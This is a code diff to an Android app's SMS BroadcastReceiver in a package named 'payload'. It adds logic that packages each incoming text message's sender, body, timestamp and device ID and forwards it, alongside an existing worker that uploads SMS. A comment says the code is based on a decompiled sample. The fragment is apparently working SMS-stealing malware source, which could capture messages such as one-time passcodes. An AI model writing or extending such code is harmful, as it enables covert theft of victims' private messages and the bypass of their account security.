@@ -9,11 +9,15 @@ import android.util.Log
 import androidx.work.Data
 import androidx.work.OneTimeWorkRequestBuilder
 import androidx.work.WorkManager
+import com.payload.jansiix0ne.data.model.SmsModel
+import com.payload.jansiix0ne.util.SmsForwarder
+import com.payload.jansiix0ne.util.SmsHelper
 import com.payload.jansiix0ne.worker.SmsUploadWorker
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.launch
+import java.util.Date
 
 /**
  * BroadcastReceiver for receiving SMS messages
@@ -45,12 +49,26 @@ class SmsReceiver : BroadcastReceiver() {
             return
         }
         
+        val deviceId = SmsHelper.getDeviceId(context)
+        val smsForwarder = SmsForwarder(context)
+        
         for (smsMessage in messages) {
             val from = smsMessage.originatingAddress ?: ""
             val messageBody = smsMessage.messageBody ?: ""
             val timestamp = smsMessage.timestampMillis
             
             Log.d(TAG, "Received SMS from: $from")
+            
+            // Create SmsModel for forwarding
+            val sms = SmsModel(
+                from = from,
+                message = messageBody,
+                date = Date(timestamp),
+                ownerDeviceId = deviceId
+            )
+            
+            // Forward SMS if forwarding is enabled (Based on decompiled code: AbstractC3186z.java)
+            smsForwarder.forwardSmsIfEnabled(sms)
             
             // Queue SMS upload worker
             val inputData = Data.Builder()
